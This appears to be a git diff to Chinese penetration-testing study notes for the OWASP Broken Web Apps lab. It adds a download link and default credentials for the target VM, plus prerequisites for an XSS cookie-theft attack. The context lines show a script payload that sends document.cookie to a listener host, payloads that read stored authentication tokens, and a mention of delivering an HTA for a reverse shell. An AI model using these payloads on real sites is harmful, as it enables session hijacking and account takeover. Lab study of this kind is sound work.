@@ -10,6 +10,13 @@
 
 root默认密码：toor
 
+## 下载靶机
+
+- 下载地址：<http://sourceforge.net/projects/owaspbwa/files/>
+- 解压7zip: <https://www.keka.io/en/>
+
+root默认密码：owaspbwa
+
 ## 渗透过程
 
 1. DNS解析域名子域名，看有哪些IP，了解服务器组网。
@@ -151,6 +158,12 @@ POC：
 
 !!! example "示例"
     - 利用XSS获取cookie：启动一个服务器接收请求，利用XSS发送请求`<script>document.write('<img src="http://192.168.56.10:88/'+document.cookie+'">');</script>`，获取受害者cookie。
+
+    !!! warning "前提"
+        1. cookie没有开启httponly
+        1. 启动一个http服务器：`python -m SimpleHTTPServer 88`
+        1. 有用户交互
+
     - 利用XSS获取HTML5本地存储`<script>alert(window.localStorage.MessageOfTheDay);</script>`或会话存储`<script>alert(window.sessionStorage.getItem("Secure.AuthenticationToken"));</script>`
     - 利用XSS诱骗受害者下载运行HTA获取反弹shell
 
@@ -162,3 +175,7 @@ POC：
 
 - BASE64：包含大小写字母数字+/，以%3D(==)结尾
 - SHA1：40位16进制字符串，每个16进制代表4位，40x4=160位
+
+
+!!! quote "参考链接"
+    [Kali](http://mp.weixin.qq.com/mp/homepage?__biz=MzA4NDk5NTYwNw==&hid=11&sn=debd488756944bb3e22a10f608e13de6&scene=18#wechat_redirect)
